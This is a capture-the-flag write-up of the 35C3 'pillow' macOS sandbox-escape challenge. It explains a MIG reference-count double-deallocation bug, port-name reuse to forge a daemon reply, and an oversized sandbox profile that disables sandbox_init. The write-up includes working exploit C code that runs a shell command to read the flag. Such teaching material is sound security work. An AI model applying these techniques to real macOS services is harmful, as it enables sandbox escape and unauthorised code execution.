Pillow
======

*This is a Writeup for the pillow challenge of 35C3CTF. **Challenge files can be found *[here](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/pillow-f7dd1b402c468db6ab47e4c3c90b7996e28e7fc5.zip)*. You can submit your exploit [here](https://vms.35c3ctf.ccc.ac/).*

*To simplify the Writeup, I'm using the source code which was released after the CTF *[here](https://github.com/saelo/35c3ctf/tree/master/pillow)*.*

*
*

In this challenge, we're given two daemons that we can talk to over MIG. Our task is to exploit the macOS sandbox, which was configured to only allow us to talk to these daemons.

Let's look into them. I will start with capsd.

capsd ([source code](https://github.com/saelo/35c3ctf/blob/master/pillow/capsd/capsd.c)) is a daemon that can be used to grant capabilities and to check if a PID has a specified capability. After looking a bit at what it does, it seemed rather uninteresting. So lets look into shelld instead.

shelld ([source code](https://github.com/saelo/35c3ctf/blob/master/pillow/shelld/shelld.c)) seemed rather promising. If you look at it's symbols (or at the functions in the source), you will find an interesting function: shell\_exec, which will execute whatever you want in a bash. However, it's not that easy. First, there is a sandbox check, which we will need to bypass. Second, the spawned bash will be sandboxed, not allowing us to read the flag. We will need to bypass as well.

Let's begin with looking at the sandbox check.

The function sandbox\_check\_with\_capabilities first tries to use the audit token sent with the message from the client to shell\_exec. The audit token contains PID, UID, GID, ... This audit token will be passed to the sandbox service to verify if the process is sandboxed. Racing that check would be very hard, especially because we can't spawn any unsandboxed processes (and because of the generation number inside the audit token). If this check fails, shelld will ask capsd if the client has the permission to use shell\_exec. We've now got two options to bypass this check: First, find a vulnerability in capsd (spoiler: There seems to be no interesting one). The second one would be to find a vulnerability in shelld.

After looking through the other functions of capsd, I found something interesting.

Can you spot the vulnerability in the following code? Hint: The code is invoked through the MIG server.

```c
kern_return_t register_completion_listener(mach_port_t server, const char* session_name, mach_port_t listener, audit_token_t client) {
    CFMutableDictionaryRef session = lookup_session(session_name, client);
    if (!session) {
        mach_port_deallocate(mach_task_self(), listener);
        return KERN_FAILURE;
    }

    CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &listener);
    CFDictionaryAddValue(session, CFSTR("listener"), value);
    CFRelease(value);

    return KERN_SUCCESS;
}
```

Found it? No?

Well, this code does not respect the MIG ownership rules. They are as follows:

*If a MIG method returns KERN\_SUCCESS it means that the method took ownership of \*all\* the arguments passed to it.
If a MIG method returns an error code, then it took ownership of \*none\* of the arguments passed to it.*

*(*[source](https://bugs.chromium.org/p/project-zero/issues/detail?id=1417)*)*

*
*

What this code however does is that if the passed-in session is invalid, it deallocates the passed-in listener port which we got from the client. It then returns KERN\_FAILURE.

MIG now assumes, because the function returned an error, that there is still a reference attached to the listener port and will deallocate it again.

Therefore, two references to the listener port will be dropped, despite that only one was sent with the message. We can now exploit this.

Bypassing the sandbox check in shell\_exec is now possible by sending capsd's port to shelld's register\_completion\_listener RPC function, together with an invalid session name. If we do this often enough, shelld will lose all it's references to capsd, freeing the port. Now we only need to create a session and attach a port to it repeatedly. If we do this often enough, one of our ports will get the same number as shelld's port to capsd. We can then send a fake reply, bypassing the sandbox check!

We should begin by writing a MIG definition file to be able to easliy send messages to shelld. It should look like this:

```c
// Filename: shelld.mig
#include <mach/std_types.defs>

subsystem shelld 133700; // Found that out through IDA...

// Doing this because kernel_version_t is defined as char * and I'm too lazy to define a new type in C ;)
type kernel_version_t = c_string[*:4096]; // Meaning: 0 to 4096 chars. We will need the 4096 later...

routine create_session(shelld: mach_port_t; in session: kernel_version_t);
routine shell_exec(shelld: mach_port_t; in session: kernel_version_t; in cmd: kernel_version_t);
routine register_listener(shelld: mach_port_t; in session: kernel_version_t; listener: mach_port_t);
routine unregister_listener(shelld: mach_port_t; in session: kernel_version_t);
```

Now we can write the code to free shelld's port to capsd

```c
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include "shelld.h"

#define TRIES 10000

extern kern_return_t
bootstrap_look_up(mach_port_t  bootstrap_port,
                  char*        service_name,
                  mach_port_t* service_port);

void deallocPortInShelld(mach_port_t shelld, mach_port_t target) {
    for (int i = 0; i < 100; i++) {
        // Session abcd does not exist
        register_listener(shelld, "abcd", target);
    }
}

int main(int argc, const char * argv[]) {
    mach_port_t shelld;
    if (bootstrap_look_up(bootstrap_port, "net.saelo.shelld", &shelld) != KERN_SUCCESS) {
        printf("Couldn't find shelld!\n");
        return -1;
    }
    
    mach_port_t capsd;
    if (bootstrap_look_up(bootstrap_port, "net.saelo.capsd", &capsd) != KERN_SUCCESS) {
        printf("Couldn't find capsd!\n");
        return -1;
    }
    
    deallocPortInShelld(shelld, capsd);
    
    // shelld's port to capsd is now deallocated
    // [Part two here]
}
```

The next step is to register a pwn session in shelld, then create ports and repeatedly send them to shelld. If we're lucky, one of them will get the same number as the old port to capsd.

```c
    // Part two

    // Create pwn session
    char *pwnSession = malloc(4096); // We will later see why this is required
    memset(pwnSession, 'A', 4095);
    pwnSession[4095] = 0;
    
    if (create_session(shelld, pwnSession) != KERN_SUCCESS) {
        printf("Failure to create session!\n");
        return -1;
    }
    
    // We will need this later to dispatch our server
    dispatch_queue_t pwnQueue = dispatch_queue_create("pwn.server", NULL);
    
    mach_port_t listenerPort;
    for (int i = 0; i < TRIES; i++) {
        printf("Try %d\n", i);
        // Create port, register with session
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &listenerPort);
        mach_port_insert_right(mach_task_self(), listenerPort, listenerPort, MACH_MSG_TYPE_MAKE_SEND);
        if (register_listener(shelld, pwnSession, listenerPort) != KERN_SUCCESS) {
            printf("Failure to register port with session!\n");
            return -1;
        }
        
        // Spawn our server, in case we succeed
        dispatch_async(pwnQueue, ^{
            char buf[2048];
            if (mach_msg((mach_msg_header_t*)buf, MACH_RCV_MSG|MACH_MSG_OPTION_NONE|MACH_RCV_TIMEOUT, 0, 2048, listenerPort, 1, 0) == KERN_SUCCESS) {
                // Succeded!
                // Now send reply
                typedef struct {
                    mach_msg_header_t Head;
                    NDR_record_t NDR;
                    kern_return_t RetCode;
                    int result;
                } Reply;
                
                // Some mach magic...
                Reply repl;
                memcpy(&repl, buf, sizeof(mach_msg_header_t));
                repl.RetCode = 0;
                repl.result = 1;
                repl.Head.msgh_id = 733201;
                repl.Head.msgh_bits &= ~MACH_MSGH_BITS_COMPLEX;
                repl.Head.msgh_size = 40;
                repl.Head.msgh_voucher_port = MACH_PORT_NULL;
                repl.Head.msgh_local_port = listenerPort;
                kern_return_t kr = mach_msg_send((mach_msg_header_t*) &repl);
                if (kr != KERN_SUCCESS) {
                    printf("Sending reply failed! %d\n", kr);
                    return;
                }
            }
        });
        
        if (shell_exec(shelld, pwnSession, "cat /flag3") == KERN_SUCCESS) {
            // Get reply and exit
            // [Part three here]
            return 0;
        }
        
        // Failed
        // Unregister but do not delete port
        unregister_listener(shelld, pwnSession);
    }
```

Now whats left is to receive the result from our exec. It will be sent to the listener port.

```c
            // Part three
            
            // Receive the output
            char buf[2048];
            if (mach_msg((mach_msg_header_t*)buf, MACH_RCV_MSG|MACH_MSG_OPTION_NONE, 0, 2048, listenerPort, MACH_MSG_TIMEOUT_NONE, 0) == KERN_SUCCESS) {
                printf("Successfully received reply!\n");
                typedef struct {
                    mach_msg_header_t Head;
                    uint64_t unk1;
                    uint32_t exitCode;
                    uint32_t unk2;
                    uint32_t unk3;
                    char result[4096];
                } Answer;
                
                Answer *ans = (Answer*) buf;
                printf("Exit code: %u\nResult: %s\n", ans->exitCode, ans->result);
                
                return 0;
            }
```

The only question that remains is how we can bypass the second sandbox, in which our shell is spawned.

Thats pretty easy: For each session, a folder in the format /tmp/shelld/\<session\> is created. This folder is then inserted into the sandbox profile used to spawn the bash. By creating a session with a really long name, sandbox\_init will fail because the profile is too large and the sandbox will never be initialized ;)

Full exploit can be found [here](https://github.com/LinusHenze/35C3_Writeups/blob/master/pillow/exploit.c). Run it with "make run".